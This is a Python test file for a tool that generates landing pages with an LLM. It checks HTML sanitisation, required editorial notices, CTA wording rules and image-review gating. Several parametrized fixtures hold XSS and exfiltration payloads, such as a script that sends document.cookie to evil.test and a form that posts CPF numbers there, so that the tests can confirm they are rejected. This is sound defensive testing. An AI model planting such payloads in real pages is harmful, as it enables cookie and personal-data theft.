import copy
import json
from types import SimpleNamespace

import pytest

from funnelforge.config.settings import RunConfig, Secrets, Settings, SiteConfig, StepConfig
from funnelforge.domain.models import Page, PageDraft, RunState, StepStatus
from funnelforge.pipeline import steps
from funnelforge.pipeline.doctrine import banned_cta_execution_hit
from funnelforge.pipeline.editorial_safety import (
    EDITORIAL_NOTICE, IMAGE_RULES, ImageReview, html_issues, image_receipt,
    reviewed_image_issues,
)
from funnelforge.pipeline.lp_template import load_lp_template, render_lp, validate_lp_content
from funnelforge.pipeline.runner import Runner
from funnelforge.prompts import render
from tests.fakes import FakeLLM
from tests.lp_conforme import RODAPE_INSTITUCIONAL, conteudo_da_lp


CONTENT = {
    "hero_title": "Guia de serviços", "hero_subtitle": "Toque e veja o guia",
    "article_title": "Entenda os requisitos", "intro": "<p>Informações para comparar.</p>",
    "sections": [{"title": "Orientação", "body": "<p>Consulte as regras.</p>"} for _ in range(4)],
    "faq": [{"q": "O portal presta o serviço?", "a": "Não. Este é um guia."} for _ in range(5)],
    "transition": "<p>Veja o próximo guia.</p>",
    "cta_texts": ["Ver o guia", "Entender os requisitos", "Como fazer a solicitação"],
}
REVIEW = {
    "third_party_branding": False, "official_document_or_interface": False,
    "personal_data_or_qr": False, "implied_approval_or_outcome": False,
    "anatomy_or_physics_error": False, "topic_mismatch": False,
    "uncertain": False, "evidence": "Pessoa lendo um caderno sem marcas ou dados pessoais.",
    "anatomy_evidence": "Dois braços conectados, mãos apoiadas sobre a mesa.",
    "topic_evidence": "Caderno de planejamento pertinente ao guia informativo.",
}


@pytest.mark.parametrize("payload", [
    '<form action="https://evil.test"><input name="cpf"></form>',
    '<p onclick="fetch(\'/x\')">Guia</p>', '<img src="x" onerror="alert(1)">',
    '<iframe src="https://evil.test"></iframe>', '[elementor-template id="123"]',
    '<a href="jav&#97;script:alert(1)">Guia</a>',
    '<p style="display:none">Identidade editorial</p>',
])
def test_lp_refuses_active_markup(payload):
    content = copy.deepcopy(CONTENT)
    content["intro"] = payload
    assert any(i.code == "unsafe_editorial_html" for i in validate_lp_content(content))
    with pytest.raises(ValueError):
        render_lp(load_lp_template(), content, ["https://creditoup.com.br/rec/guia/"])


def test_notice_is_first_visible_element_and_not_model_supplied():
    content = copy.deepcopy(CONTENT)
    content["hero_title"] = '<script>alert("x")</script>'
    content["faq"][0]["q"] = '"][evil-code]'
    nodes, _ = render_lp(load_lp_template(), content,
                         ["https://creditoup.com.br/rec/guia/"],
                         site_domain="https://creditoup.com.br")
    first = nodes[0]
    assert not any(k.startswith("hide_") for k in first["settings"])
    notice = first["elements"][0]["settings"]["html"]
    assert EDITORIAL_NOTICE in notice and "creditoup.com.br" in notice
    blob = json.dumps(nodes, ensure_ascii=False)
    assert "<script>" not in blob and "[evil-code]" not in blob


@pytest.mark.parametrize("cta", ["Solicitar agora", "Solicite seu cartão", "Libere seu benefício"])
def test_direct_execution_cta_blocked_per_button(cta):
    content = copy.deepcopy(CONTENT)
    content["cta_texts"][2] = cta
    assert any(i.code == "cta_execution" for i in validate_lp_content(content))


@pytest.mark.parametrize("cta", ["Como fazer a solicitação", "Como solicitar pelo app",
                                  "Ver o guia de emissão", "Como emitir o documento"])
def test_informational_service_topic_preserved(cta):
    assert banned_cta_execution_hit(cta) is None


def test_free_text_collection_refused_but_choice_widget_allowed():
    assert html_issues('<label>CPF<input type="text"></label>')
    assert html_issues('<input type="password">')
    assert html_issues('<textarea></textarea>')
    assert not html_issues('<input type="radio" value="guia"><select><option>A</option></select>')


@pytest.mark.parametrize("html", [
    '<script>navigator.sendBeacon("https://evil.test", document.cookie)</script>',
    '<script>location.href="https://evil.test"</script>',
    '<script src="https://evil.test/x.js"></script>',
    '<svg><a xlink:href="javascript:alert(1)">go</a></svg>',
    '<style>@import "https://evil.test/a.css";</style>',
    '[contact-form-7 id="1"]',
])
def test_article_rejects_executable_additions(html):
    assert html_issues(html)


def test_real_engine_widget_remains_usable_and_cannot_hide_added_script():
    from tests.test_widgets import _cru
    from funnelforge.widgets import ler, renderizar

    block = renderizar(ler(_cru()))
    assert not html_issues(block)
    assert "não consulta cadastros" in block
    assert html_issues(block.replace("</script>", ';location.href="/fake";</script>'))


def test_image_receipt_bound_to_actual_bytes(tmp_path):
    path = tmp_path / "p1.webp"
    path.write_bytes(b"image-A")
    state = RunState(run_id="test", images={1: str(path)})
    assert reviewed_image_issues(state, 1)
    state.image_reviews[1] = image_receipt(path, ImageReview(**REVIEW))
    assert not reviewed_image_issues(state, 1)
    path.write_bytes(b"image-B")
    assert reviewed_image_issues(state, 1)


def _lp_deps(tmp_path):
    settings = Settings(secrets=Secrets(), site=SiteConfig(domain="https://creditoup.com.br"),
                        run=RunConfig(hero_image=True), routing={"LP": {}},
                        steps={"image": StepConfig(model="gpt-4.1")})
    publisher = SimpleNamespace(create_elementor_page=lambda **kw: pytest.fail("Must not write WP"),
                                upload_media=lambda **kw: pytest.fail("Must not upload"))
    return SimpleNamespace(settings=settings, runner=SimpleNamespace(runs_dir=tmp_path),
                           publisher=publisher)


def test_final_lp_gate_and_manual_publish_refuse_missing_notice(tmp_path):
    deps = _lp_deps(tmp_path)
    # O content_gate da LP também roda o portão do destino pago: a LP precisa
    # do rodapé declarado e do piso de conteúdo para começar verde.
    deps.settings.site.rodape_institucional = RODAPE_INSTITUCIONAL
    page = Page(page_number=1, page_type="LANDING PAGE", h1_title="Guia",
                slug="guia", next_page_slug="guia-pr")
    conteudo = conteudo_da_lp(cta_texts=CONTENT["cta_texts"])
    state = RunState(run_id="example", drafts={1: PageDraft(
        page_number=1, page_type="LANDING PAGE", format="lp_json",
        content=json.dumps(conteudo, ensure_ascii=False))})
    steps.step_build(state, page, deps)
    steps.step_content_gate(state, page, deps)
    assert state.step_status["content_gate_p1"].status is StepStatus.OK
    path = tmp_path / "example" / "p1.elementor.json"
    elements = json.loads(path.read_text())
    path.write_text(json.dumps(elements[1:]))
    steps.step_content_gate(state, page, deps)
    assert state.step_status["content_gate_p1"].status is StepStatus.FAILED
    steps.step_publish(state, page, deps)
    assert state.step_status["publish_p1"].status is StepStatus.FAILED


@pytest.mark.parametrize("flag", [None, "third_party_branding", "uncertain", "malformed",
                                  "anatomy_or_physics_error", "topic_mismatch"])
def test_actual_image_review_controls_image_admission(tmp_path, flag):
    deps = _lp_deps(tmp_path)
    review = dict(REVIEW)
    if flag not in (None, "malformed"):
        review[flag] = True
    llm = FakeLLM([
        "Photo with unbranded notebook", "{}" if flag == "malformed" else json.dumps(review),
    ])
    deps.runner = Runner(llm, max_retries=0, runs_dir=tmp_path)
    prompts = []
    deps.image_gen = SimpleNamespace(
        generate=lambda prompt, **kw: prompts.append(prompt) or b"bytes")

    def save(data, path):
        path.write_bytes(data)
        return path

    deps.image_proc = SimpleNamespace(to_webp=save)
    state = RunState(run_id="image")
    page = Page(page_number=1, page_type="LANDING PAGE", h1_title="Guia", slug="guia")
    steps.step_image(state, page, deps)
    assert IMAGE_RULES in prompts[0]
    assert (1 in state.images) is (flag is None)
    assert len(llm.calls) == 2  # Same prompt + review calls, no regeneration loop.
    review_prompt = llm.calls[1]["messages"][0]["content"][0]["text"]
    assert "Headline: Guia" in review_prompt
    assert "Trace each person's visible arms" in review_prompt
    image_message = llm.calls[1]["messages"][0]["content"][1]
    assert image_message["image_url"]["url"].startswith("data:image/webp;base64,")


def test_old_compliance_only_image_review_cannot_approve_anatomy(tmp_path):
    path = tmp_path / "p1.webp"
    path.write_bytes(b"unchanged-legacy-image")
    receipt = image_receipt(path, ImageReview(**REVIEW))
    receipt["policy"] = "editorial-2026-09-17"
    state = RunState(run_id="legacy", images={1: str(path)}, image_reviews={1: receipt})
    assert reviewed_image_issues(state, 1)
    for field in (
        "anatomy_or_physics_error", "topic_mismatch", "anatomy_evidence", "topic_evidence",
    ):
        receipt["review"].pop(field)
    assert reviewed_image_issues(state, 1)


@pytest.mark.parametrize("field", ["evidence", "anatomy_evidence", "topic_evidence"])
def test_image_review_requires_evidence_for_each_dimension(field):
    assert not ImageReview(**{**REVIEW, field: " "}).accepted


@pytest.mark.parametrize("name", ["image_prompt", "image_prompt_lp"])
def test_scene_planning_receives_topic_and_previous_scene(name):
    prompt = render(name, headline="Guia SENAI", keywords=["eletricidade"],
                    previous_scenes=["inactive technical bench"], page_number=3)
    assert "Guia SENAI" in prompt and "eletricidade" in prompt
    assert "inactive technical bench" in prompt
    assert "Page: 3" in prompt


@pytest.mark.parametrize("name", ["redator_p1", "redator_pages", "redator_presell", "seo", "judge"])
def test_editorial_role_in_all_writing_surfaces(name):
    prompt = render(name)
    assert "<contrato_editorial_independente>" in prompt
    assert "Não substitua o tema por eufemismos" in prompt
